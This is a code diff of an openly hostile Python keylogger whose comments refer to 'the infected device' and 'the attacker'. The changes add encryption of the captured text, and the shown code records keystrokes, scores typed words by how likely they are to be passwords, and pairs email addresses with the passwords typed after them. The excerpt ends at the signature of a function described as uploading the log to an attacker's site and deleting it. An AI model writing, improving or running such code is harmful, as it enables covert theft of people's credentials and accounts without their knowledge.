@@ -5,6 +5,7 @@ from typing import IO
 import requests
 import uuid
 import time
+import encryption_decryption
 
 #Create a filename based off the current timestamp and the infected device's MAC address
 #The name is in the format timestamp MAC address
@@ -13,10 +14,12 @@ def generate_file_name()-> str:
     time_stamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
     return str(time_stamp+" "+str(uuid.getnode()))
 
-def create_logged_keys_file(path:str, file_name:str)->IO:
+#Creates the logged_words_file and returns an IO object for writing to the file
+def create_logged_words_file(path:str, file_name:str)->IO:
     file_path = os.path.join(path, file_name)
-    return os.open(file_path, "a")
+    return open(file_path, "ab")
 
+#Determines the priority of a word bassed off of how likely it is to be a password
 def word_priority_predictor(word:str)->int:
     #Matches any string that is 8 characters or more, as most passwords usually are
     length_regex = re.compile(r'^.{8,}$')
@@ -30,30 +33,37 @@ def word_priority_predictor(word:str)->int:
             return 1
     return 2
 
+#Keeps track of the word being typed until enter or space or tab is logged
 def read_word_being_typed():
     word:str = ""
     def closure(event: keyboard.KeyboardEvent):
         nonlocal word #To create a closure
-        if event.name == "enter" or event.name == "space":
+        #If enter, space or tab is logged then return true cause we assume the infected has finished typing the word
+        if event.name == "enter" or event.name == "space" or event.name == "tab":
             return word, word_priority_predictor(word)
         elif event.name == "backspace":
             word = word[:-1] if word else "" #To avoid an IndexError for cases where the string is empty
+            return False
         else:
-            #If only one character was entered, to avoid saving keyboard events like tab, ctrl etc
+            #Update the word string if only one character was entered, to avoid saving keyboard events like ctrl, shift etc
             if len(event.name)==1:
                 word+=event.name
             return False
     return closure
 
+#Check whether the typed word is potentially an email
 def email_check(word: str):
     email_regex = re.compile('^[\w+\-.]+@[a-z\d\-]+(\.[a-z\d\-]+)*\.[a-z]+$')
     return email_regex.match(word)
 
-
-
-def update_logged_keys_file(word: str, priority: int, file: IO):
-    #If the word is an email then we dont add a newspace character cause it's likely the password will come after it, and also we want the emails to have the same priority as their corresponding password
-    file.write("email: "+ word +" password: ") if email_check(word) else file.write(word+" "+str(priority)+"\n") 
+#Encrypt the logged word then write it to the logged_words_file
+def update_logged_words_file(word: str, priority: int, public_key: encryption_decryption.rsa.RSAPublicKey, file: IO):
+    #If the word is an email then we dont add a newspace character cause it's highly likely the password will come after it, and also we want the emails to have the same priority as their corresponding password
+    logged_word = "email: "+ word +" password: " if email_check(word) else word+" "+str(priority)+"\n"
+    #Convert the string into bytes for encryption
+    logged_word = logged_word.encode() 
+    logged_word = encryption_decryption.encrypt(logged_word, public_key)
+    file.write(logged_word)
 
 #Upload the file to whatever site the attacker wants then delete it
 def upload(file_path:str, file_name:str, url:str, token:str)->bool:
